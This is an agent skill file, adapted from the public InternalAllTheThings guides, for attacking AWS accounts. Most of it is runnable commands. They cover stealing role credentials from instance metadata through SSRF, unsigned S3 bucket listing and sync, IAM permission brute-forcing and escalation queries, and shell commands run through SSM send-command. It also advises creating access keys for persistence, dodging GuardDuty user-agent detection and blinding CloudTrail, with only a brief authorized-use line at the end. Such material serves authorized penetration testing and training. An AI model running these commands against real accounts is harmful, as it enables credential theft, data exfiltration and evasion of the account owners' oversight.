---
name: aws-security
description: >-
  Assess and attack AWS: access-token and key abuse, IAM privilege escalation, IMDSv1/v2 metadata
  SSRF, S3 bucket exposure, EC2, Lambda, SSM, DynamoDB, Cognito, enumeration and IOC detection.
  Use when an engagement includes AWS, when you find AWS keys or an SSRF into instance metadata,
  when reviewing IAM policies for escalation paths, or when triaging AWS incident indicators.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "13"
  generated-by: build/build.py
---

# AWS Security Assessment

Every AWS action is authorised by a credential, so the engagement runs credential-first: obtain a key (leak, SSRF into instance metadata, unauthenticated Cognito identity pool), establish the account and principal, then enumerate what that principal can *actually* do rather than what the policy claims. The high-value output is the permission pair that chains into administrator or into data. Done means: account ID, principal ARN, effective permission set, and one proven path to data or admin.

## When to use this skill

- AWS is in scope and you hold an access key (`AKIA…` long-term, `ASIA…` temporary), a session token, or a role name.
- You have an SSRF or arbitrary file read on a workload that may be EC2, ECS/Fargate or Lambda, and need the metadata path.
- You are reviewing IAM policy JSON for escalation ("shadow admin") permissions.
- You need to triage CloudTrail/GuardDuty indicators, including your own footprint.
- Not this skill: Docker/Kubernetes runtime → `container-security`; pipeline tokens and build secrets → `cicd-supply-chain-security`; Azure/Entra → `azure-entra-security`; IBM Cloud → `ibm-cloud-security`; on-prem AD reachable from a compromised host → `active-directory-enumeration` / `active-directory-credentials`.

## First moves

1. Identify the credential first. `ASIA`-prefixed keys are temporary STS credentials and are useless without the matching session token exported next to them.

```bash
export AWS_ACCESS_KEY_ID=...  AWS_SECRET_ACCESS_KEY=...  AWS_SESSION_TOKEN=...
aws sts get-caller-identity          # Account + Arn: tells you whose account you are in
```

2. Dump the whole IAM picture when the principal can read it - the cheapest complete map of principals and their attached policies:

```bash
aws iam get-account-authorization-details > iam.json
aws iam list-users; aws iam list-groups; aws iam list-access-keys; aws iam list-mfa-devices
```

3. When policies are not readable, brute the permission surface and log only the calls that succeed:

```bash
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
# INFO lines name successful APIs, e.g. "get_account_authorization_details worked!"
```

4. Turn the permission set into escalation paths. PMapper and CloudFox work from a profile, not raw keys:

```bash
pmapper graph --create
pmapper query "preset privesc *"              # every principal that can escalate
pmapper query "preset connected user/<name> *"
cloudfox aws --profile <profile-name> all-checks
```

5. Metadata path from an SSRF or on-host read. IMDSv1 answers a plain GET; IMDSv2 requires the token PUT first, so a full read needs both hops.

```bash
export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# then the role name from that listing:
curl -H "X-aws-ec2-metadata-token:$TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>"
```

The returned `AccessKeyId`/`SecretAccessKey`/`Token` go straight back into step 1. For Fargate/ECS, read `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` out of `/proc/self/environ` and fetch `http://169.254.170.2<URI>` instead.

6. Unauthenticated S3, no keys at all. Region matters: `--no-sign-request` against the wrong region returns a redirect, not a listing.

```bash
aws s3 ls s3://<bucket> --no-sign-request --region <region>
aws s3 sync s3://<bucket>/ . --no-sign-request --region <region>
dig <bucket>.s3.amazonaws.com && nslookup <returned-ip>   # reverse name gives s3-website-<region>
```

7. Command execution through SSM when the principal has an instance role and the agent is installed. `describe-instance-information` is the precondition check - a missing instance there means `send-command` will silently reach nothing.

```bash
aws ssm describe-instance-information
aws ssm send-command --instance-ids "<INSTANCE-ID>" --document-name "AWS-RunShellScript" \
  --parameters commands=whoami --output text --query "Command.CommandId"
aws ssm list-command-invocations --command-id "<COMMAND-ID>" --details \
  --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}"
```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [aws-cli.md](references/aws-cli.md) | before anything else if no profile exists | `aws configure --profile`, `~/.aws/credentials` vs `~/.aws/config`, `--profile` on every call |
| [aws-access-token.md](references/aws-access-token.md) | you have a key ID and need its type, account ID, or console access | ID prefixes (AKIA/ASIA/AIDA/AROA…), base32 account-ID recovery, `aws_consoler`, per-service URL patterns |
| [aws-enumeration.md](references/aws-enumeration.md) | you need a collector or a permission sweep | ScoutSuite, Pacu, cloudsplaining, CloudFox, Prowler, PMapper presets, enumerate-iam |
| [aws-iam.md](references/aws-iam.md) | you are deciding which permission means admin | shadow-admin permission list with the exact `aws` call for each (`iam:CreateAccessKey`, `iam:PassRole`+`lambda:CreateFunction`, …), MFA session token |
| [aws-metadata-ssrf.md](references/aws-metadata-ssrf.md) | a workload can be made to fetch a URL or read a file | EC2 169.254.169.254 walk, Fargate 169.254.170.2, IMDSv2 token, AWS APIs that return credentials |
| [aws-s3-bucket.md](references/aws-s3-bucket.md) | a bucket, bucket name or public bucket URL is known | public bucket shapes, list/sync, object versions, `--no-sign-request`, bucket-finder, s3-objects-check |
| [aws-ec2.md](references/aws-ec2.md) | you need host-level data or instance access | describe-instances, AMI copy, EBS mount, snapshot takeover (`createVolumePermission`), Shadow Copy → ntds.dit, Instance Connect |
| [aws-ssm.md](references/aws-ssm.md) | an instance has an SSM-managed role | `send-command` + `list-command-invocations` recipe, AMIs with the agent preinstalled |
| [aws-lambda-apigw.md](references/aws-lambda-apigw.md) | the principal can touch Lambda or API Gateway | list/invoke functions, `get-function --query Code.Location` to pull the deployment zip, REST API keys |
| [aws-dynamodb.md](references/aws-dynamodb.md) | a DynamoDB table or a local DynamoDB endpoint is reachable | `list-tables`, `scan --table-name … \| jq -r '.Items[]'`, `--endpoint-url` for non-AWS hosts |
| [aws-cognito.md](references/aws-cognito.md) | the target app uses Cognito and you have a pool ID | User Pool vs Identity Pool, unauthenticated `get_credentials_for_identity`, cognito-scanner account oracle |
| [aws-ioc-detection.md](references/aws-ioc-detection.md) | before acting, or when triaging alerts | CloudTrail deletion/region scoping, GuardDuty user-agent detection on Kali/Pentoo/Parrot |
| [aws-training.md](references/aws-training.md) | you need a lab to validate a chain | CloudFoxable, AWSGoat, flaws.cloud, cloudgoat, sadcloud |

## Workflow

1. **What do I hold?** A key → `aws-access-token.md` (prefix identifies the principal type; a key ID can decode to the account ID). A token without a key → jump to `aws-metadata-ssrf.md` or `aws-access-token.md` internal-HTTP-API section.
2. **What can it do?** Try `aws iam get-account-authorization-details` first. On `AccessDenied`, run `enumerate-iam.py`, then PMapper `preset privesc` and CloudFox `all-checks` - that combination replaces blind service-by-service guessing.
3. **Branch on the permission set** (`aws-iam.md` has the full table):
   - `iam:CreateAccessKey` / `iam:CreateLoginProfile` / `iam:Attach*Policy` → you are already administrator-equivalent; stop enumerating.
   - `iam:PassRole` + `lambda:CreateFunction`/`ec2:RunInstances`/`glue:CreateDevEndpoint` → create a workload carrying a privileged role instead of fighting IAM.
   - `s3:*` or public bucket names → `aws-s3-bucket.md`; the data is usually the objective.
   - `ec2:*` → `aws-ec2.md` for snapshots and AMI copy.
   - Only compute/SSM → `aws-ssm.md` for shell.
4. **Pivot off the workload.** If the credential came from an SSRF, stay in `aws-metadata-ssrf.md`: the API-calls-that-return-credentials list is the escalation menu from a low-privilege role.
5. **Confirm blast radius and detection.** `aws-ioc-detection.md` before destructive action; note CloudTrail coverage and GuardDuty user-agent rules. `aws-training.md` lists labs when the live environment cannot be probed safely.

## Gotchas

- IMDSv2 instances reject a plain GET on `/latest/meta-data/`. The `X-aws-ec2-metadata-token-ttl-seconds` PUT is not optional, so an SSRF payload that cannot set headers cannot read metadata on IMDSv2.
- `ASIA` keys expire within hours; losing the session token means re-collecting, not re-signing.
- GuardDuty raises findings on API calls whose User-Agent identifies Kali/Pentoo/Parrot; stock `awscli` from those distributions is noisy. Pacu rewrites the user agent for this reason.
- `aws iam create-access-key` / `create-login-profile` are the fastest persistence but appear immediately in IAM listings (`list-access-keys`, login profile) - they are loud by construction.
- The `ssm-user` account is not removed when the SSM Agent is uninstalled - SSM-based access can leave a local account behind on the host.
- `get-function` returns a presigned `Code.Location` URL - download it with plain `wget -O lambda.zip "<url>"`; the AWS CLI `--profile` flag does not apply to that URL.
- CloudTrail can be blinded (`delete-trail`, `--no-include-global-service-event`, `--no-is-multi-region`), but those calls are recorded themselves - an OPSEC decision, not clean-up.

## Authorized use

These techniques are for authorized engagements only, with explicit permission and within the agreed scope. AWS testing of a third party requires their consent; some providers additionally require pre-notification.

## Source

Converted from the upstream InternalAllTheThings AWS guides (https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
